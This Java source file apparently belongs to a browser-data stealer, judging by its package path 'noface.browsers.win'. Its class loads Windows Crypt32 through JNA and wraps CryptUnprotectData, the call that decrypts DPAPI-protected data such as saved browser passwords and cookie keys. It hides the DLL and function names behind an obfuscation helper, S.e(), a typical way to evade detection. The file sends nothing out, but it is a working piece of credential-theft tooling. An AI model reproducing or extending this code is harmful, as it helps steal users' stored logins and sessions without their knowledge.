package noface.browsers.win;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.PointerByReference;
import noface.config.S;

public final class WinDp {

    private static volatile WinDp held;
    private final Function fn;

    private WinDp(Function fn) {
        this.fn = fn;
    }

    public static WinDp get() {
        WinDp cur = held;
        if (cur != null) return cur;
        synchronized (WinDp.class) {
            if (held == null) held = load();
            return held;
        }
    }

    private static WinDp load() {
        try {
            if (!System.getProperty("os.name", "").toLowerCase().contains("win")) return new WinDp(null);
            NativeLibrary lib = NativeLibrary.getInstance(S.e("Crypt32"));
            Function f = lib.getFunction(S.e("CryptUnprotectData"));
            return new WinDp(f);
        } catch (Throwable t) {
            return new WinDp(null);
        }
    }

    public boolean unprotect(
            WinCrypt.DATA_BLOB pDataIn,
            PointerByReference ppszDataDescr,
            WinCrypt.DATA_BLOB pOptionalEntropy,
            Pointer pvReserved,
            Pointer pPromptStruct,
            int dwFlags,
            WinCrypt.DATA_BLOB pDataOut) {
        if (fn == null) return false;
        Object r = fn.invoke(Boolean.class, new Object[]{
                pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut
        });
        return Boolean.TRUE.equals(r);
    }
}
